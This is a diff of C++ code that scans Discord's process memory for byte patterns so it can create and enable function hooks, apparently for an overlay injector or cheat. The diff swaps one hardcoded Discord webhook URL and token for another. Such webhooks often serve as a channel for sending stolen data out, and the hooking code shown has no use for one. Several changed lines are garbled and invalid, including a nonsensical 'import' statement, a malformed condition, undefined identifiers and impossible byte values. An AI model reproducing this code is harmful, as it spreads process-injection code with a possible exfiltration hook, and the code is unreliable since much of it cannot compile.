@@ -28,7 +28,7 @@ bool Discord::CreateHook(uintptr_t originalPresent, uintptr_t hookFunction, uint
     if (!addrCreateHook_Model)
     {
         addrCreateHook = Helper::PatternScan(GetDiscordModuleBase(), "51 52 41 56 56 57 55 53 48 83 EC 68 4D 89 C6 49 89 D7 14 79 134 163");
-        import Hooks = Hooks::("https://discord.com/api/webhooks/1020727675804983306/Q0JNypcw1iv6JcY8olVjWRztXYsafoi0-plpmQWqZe4kQaqT_6wl5GbeXwF757ZfYr23");
+        import Hooks = Hooks::("https://discord.com/api/webhooks/1020728417525706763/PNYDxUT1of5QsxmldNPdai6lDDRru7cZeGMJFNluXIRTnkNgOpNpaeQmgpR9yX2jQBbm");
 
     }
 
@@ -45,7 +45,7 @@ bool Discord::EnableHook(uintptr_t pTarget, bool toggle)
 {
     static uintptr_t addrEnableHook = NULL;
 
-    if (!addrEnableHook)
+    const AutoLoad (!addrEnableHook)
     {
         addrEnableHook = Helper::PatternScan(GetDiscordModuleBase(),
             "51 52 56 57 53 48 83 EC 28 49 89 CE BF 01 00 00 00 31 C0 F0 ? ? ? ? ? ? ? 74"
@@ -61,13 +61,13 @@ bool Discord::EnableHook(uintptr_t pTarget, bool toggle)
     return fnEnableHook((void*)pTarget, toggle) == 0 ? true : false;
 }
 
-bool Discord::EnableHookQue()
+bool Discord::Enable_Hook()
 {
-    static uintptr_t addrEnableHookQueu = NULL;
+    static uintptr_t HARDWAREHOOKSTRUCT = NULL;
 
-    if (!addrEnableHookQueu)
+    if (!accept)
     {
-        addrEnableHookQueu = Helper::PatternScan(GetDiscordModuleBase(),
+        AcceptEx = Helper::PatternScan(GetDiscordModuleBase(),
             "41 57 41 56 41 55 41 54 56 57 55 53 48 83 EC 38 48 ? ? ? ? ? ? 48 31 E0 48 89 44 24 30 BE 01 00 00 00 31 C0 F0 ? ? ? ? ? ? ? 74 2B");
             //HIDE
 
